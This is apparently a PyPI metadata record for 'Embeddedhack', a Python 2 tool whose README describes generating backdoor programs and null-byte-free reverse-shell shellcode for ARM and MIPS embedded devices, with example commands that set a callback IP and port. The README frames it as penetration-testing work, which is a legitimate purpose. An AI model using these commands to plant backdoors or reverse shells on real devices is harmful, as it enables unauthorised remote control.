{
  "info": {
    "author": "doudoudedi",
    "author_email": "doudoudedi233@gmail.com",
    "bugtrack_url": null,
    "classifiers": [],
    "description": "# introduction\n\n#### foreword\n\n>In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language\n\n#### fuction\n\nThis tool is embedded in the security test of the device. There are two main functions:\n\n1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal in size.**Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**\n\n2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**\n\n#### Construct ELF\n  python2 install pwn\n```\npip install pwn\n```\n\n​\tThis tool is developed in python language, so converting python to ELF can be done through **nuitka**\n\n```shell\nnuitka hackEmbedded_tool.py\n```\n\n​\tIf possible, put the modules that generate various backdoors and reverse_shellcode under python's site-packages\n\n```\nsudo cp ./generate_* {your_dir}/site-packages\nsudo cp ./extract_shellcode.py {your_dir}/site-packages\n```\n\nYou can view the path in sys.path under the python terminal\n\n```\nPython 2.7.17 (default, Mar 18 2022, 13:21:42) \n[GCC 7.5.0] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import sys\n>>> sys.path\n```\n\n#### Instructions for use\n\n​\tTo use the generated backdoor or reverse_shellcode, you need to specify the ip address, port number, assembly architecture, endian （Default is armv7）\n\n​\t**Here is the example that generates reverse_shellcode without null bytes**\n\n```\nhackEmbedded_tool -reverse_ip 192.168.7.1 -reverse_port 444 -arch arm -endian little -exploit_shellcode 1\n```\n![image-20220428161403858](./img/image-20220428161403858.png)\n\n**This is the usage list for generating the backdoor file of the corresponding schema**\n```\nhackEmbedded_tool -reverse_ip 192.168.7.1 -reverse_port 444 -arch arm -endian little -backdoor_file 1\n```\n\n![image-20220428161757170](./img/image-20220428161757170.png)\n\n**You can view tool information with -h**\n\n![image-20220428161847829](./img/image-20220428161847829.png)\n\n\n#### chips and architectures\nTests can leverage chips and architectures\n\nMips:\nMIPS 74kc V4.12 big endian\nMIPS 24kc V5.0  little endian\n\nArmv7:\nAllwinner(全志)V3s\n\nArmv8:\nQualcomm Snapdragon 660\n\n#### One-click build environment\n\nTo be added",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "https://github.com/doudoudedi/hackEmbedded",
    "keywords": "",
    "license": "MIT",
    "maintainer": "",
    "maintainer_email": "",
    "name": "Embeddedhack",
    "package_url": "https://pypi.org/project/Embeddedhack/",
    "platform": null,
    "project_url": "https://pypi.org/project/Embeddedhack/",
    "project_urls": {
      "Homepage": "https://github.com/doudoudedi/hackEmbedded"
    },
    "release_url": "https://pypi.org/project/Embeddedhack/0.0.2/",
    "requires_dist": null,
    "requires_python": "",
    "summary": "This tool is used for backdoor and shellcode generation for various architecture devices",
    "version": "0.0.2",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 13660884,
  "releases": {
    "0.0.1": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "77baa15291ea24f54c3bfec4592c5d1f04c8d78f6d58bb0eb33b2fd1ac48ec7c",
          "md5": "e9d5e42af92a86ca89eba4bcc5527d35",
          "sha256": "8a1f3351fd57668133e4f5ef6a9e2d3f071c3104ff6b18ef500ae5ed66e8b743"
        },
        "downloads": -1,
        "filename": "Embeddedhack-0.0.1.tar.gz",
        "has_sig": false,
        "md5_digest": "e9d5e42af92a86ca89eba4bcc5527d35",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 3954,
        "upload_time": "2022-04-29T03:52:32",
        "upload_time_iso_8601": "2022-04-29T03:52:32.422850Z",
        "url": "https://files.pythonhosted.org/packages/77/ba/a15291ea24f54c3bfec4592c5d1f04c8d78f6d58bb0eb33b2fd1ac48ec7c/Embeddedhack-0.0.1.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ],
    "0.0.2": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "324e88457fdf727edcb27757bc5bb6a31888737d9b0991185a56fcc5c3c6967f",
          "md5": "e40c535e26a4c407027c590464ee3833",
          "sha256": "42ef71bb78459b39a651c14e7255c1ddd372f57232a034f0bd1e18d022ae0847"
        },
        "downloads": -1,
        "filename": "Embeddedhack-0.0.2.tar.gz",
        "has_sig": false,
        "md5_digest": "e40c535e26a4c407027c590464ee3833",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 4252,
        "upload_time": "2022-04-29T04:06:21",
        "upload_time_iso_8601": "2022-04-29T04:06:21.073927Z",
        "url": "https://files.pythonhosted.org/packages/32/4e/88457fdf727edcb27757bc5bb6a31888737d9b0991185a56fcc5c3c6967f/Embeddedhack-0.0.2.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "324e88457fdf727edcb27757bc5bb6a31888737d9b0991185a56fcc5c3c6967f",
        "md5": "e40c535e26a4c407027c590464ee3833",
        "sha256": "42ef71bb78459b39a651c14e7255c1ddd372f57232a034f0bd1e18d022ae0847"
      },
      "downloads": -1,
      "filename": "Embeddedhack-0.0.2.tar.gz",
      "has_sig": false,
      "md5_digest": "e40c535e26a4c407027c590464ee3833",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": null,
      "size": 4252,
      "upload_time": "2022-04-29T04:06:21",
      "upload_time_iso_8601": "2022-04-29T04:06:21.073927Z",
      "url": "https://files.pythonhosted.org/packages/32/4e/88457fdf727edcb27757bc5bb6a31888737d9b0991185a56fcc5c3c6967f/Embeddedhack-0.0.2.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}